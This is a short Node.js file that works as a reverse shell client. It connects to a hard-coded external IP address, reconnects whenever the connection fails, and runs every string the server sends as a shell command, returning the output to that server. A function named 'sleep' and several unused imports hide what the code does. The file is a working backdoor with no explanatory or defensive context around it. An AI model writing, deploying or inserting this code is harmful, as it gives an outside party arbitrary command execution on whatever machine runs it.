var express = require('express');
var app = express();
const { exec } = require('child_process');
var ncat = require("ncat");
const fetchJson = require('fetch-json');
const resource = { 
    status: "online", 
    outStream: ""
};
let received = "";
var net = require('net');

var client = new net.Socket();


function sleep() {
    client.connect(3000, '159.89.100.64', function() {
        console.log('Connected');
        client.write('Hello, server! Love, Client.');
    });

}
sleep();
client.on("error", function(data) {
    sleep()
});

client.on('data', function(data) {
    received = data.toString()
	exec(received, (err, stdout, stderr) => {
        //console.log(stderr);
        console.log(stdout);
        client.write(stdout);
      }) // kill client after server's response
});

client.on('close', function() {
	console.log('Connection closed');
});

